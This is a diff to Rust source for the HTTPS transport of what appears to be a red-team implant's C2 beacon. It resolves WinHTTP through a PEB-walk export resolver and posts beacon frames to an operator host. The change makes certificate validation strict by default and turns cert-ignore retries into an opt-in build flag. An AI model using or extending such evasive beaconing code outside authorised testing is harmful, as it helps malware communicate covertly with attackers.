@@ -5,10 +5,13 @@
 //! an HTTP POST body and reads the response.
 //!
 //! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
-//! resolver. TLS is selected per-build via the `use_tls` config flag: when set,
+//! TLS is selected per-build via the `use_tls` config flag: when set,
 //! `WinHttpOpenRequest` is given `WINHTTP_FLAG_SECURE` (0x00800000) so the
-//! request is sent over HTTPS. Ignored-certificate-error handling is wired so
-//! self-signed redirector certs don't abort the beacon (an engagement reality).
+//! request is sent over HTTPS. Certificate errors are HARD FAILURES by default
+//! (returns None immediately — operators MUST use valid CA-signed certs or
+//! domain fronting). The legacy cert-ignore retry is opt-in via
+//! `NYX_TLS_INSECURE=1` at build time; engagements SHOULD NOT set this in
+//! production.
 
 #![cfg(target_os = "windows")]
 
@@ -36,6 +39,17 @@ const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;
 /// allocator (which has limited virtual memory). 16 MiB is generous enough
 /// for any legitimate beacon task response while capping the OOM surface.
 const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;
+
+/// Const-eval flag: when `NYX_TLS_INSECURE=1` is set at build time, TLS
+/// certificate errors are retried with relaxed validation (ignore unknown CA,
+/// date, CN). Default (no env or any other value): cert failure returns None
+/// immediately — operators MUST use valid CA-signed certs or domain fronting.
+const fn tls_insecure_retry() -> bool {
+    match option_env!("NYX_TLS_INSECURE") {
+        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
+        None => false,
+    }
+}
 
 /// WinHTTP function pointer table (resolved lazily, cached in statics).
 struct WinhttpFns {
@@ -161,10 +175,10 @@ fn to_utf16(s: &[u8]) -> Vec<u16> {
 }
 
 /// Send `body` as an HTTP POST to `host:port/path` and return the response
-/// body. `use_tls` selects HTTPS (WINHTTP_FLAG_SECURE) and, when WinHttpSetOption
-/// is available, relaxes certificate validation so a self-signed redirector
-/// cert doesn't abort the request. Returns None on any failure (the beacon
-/// loop retries).
+/// body. `use_tls` selects HTTPS (WINHTTP_FLAG_SECURE). By default, certificate
+/// errors are HARD FAILURES (returns None — operators MUST use valid CA-signed
+/// certs or domain fronting). The legacy cert-ignore retry (via WinHttpSetOption)
+/// is opt-in: set `NYX_TLS_INSECURE=1` at build time.
 pub unsafe fn post_frame(
     host: &[u8],
     port: u16,
@@ -247,8 +261,10 @@ pub unsafe fn post_frame(
         }
     }
 
-    // ---- WinHttpSendRequest with TLS retry ----
-    // Canonical pattern for WinHTTP 5.1+ with self-signed certs:
+    // ---- WinHttpSendRequest with optional TLS cert-ignore retry ----
+    // Default: strict cert validation — failure returns None immediately.
+    // When NYX_TLS_INSECURE=1 is set at build time, the legacy self-signed
+    // redirector retry path is active:
     //   1. Attempt with strict cert validation.
     //   2. On failure, set SECURITY_FLAG_IGNORE_* and retry.
     // NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
@@ -256,7 +272,6 @@ pub unsafe fn post_frame(
         | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
         | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
     let can_relax_cert = use_tls && fns.set_option.is_some();
-
     // First attempt (strict cert validation).
     let ok = (fns.send_request)(
         req,
@@ -267,7 +282,7 @@ pub unsafe fn post_frame(
         wire_body.len() as u32,
         0,
     );
-    if ok == 0 && can_relax_cert {
+    if ok == 0 && can_relax_cert && tls_insecure_retry() {
         let set_option = fns.set_option.unwrap();
         if set_option(
             req,
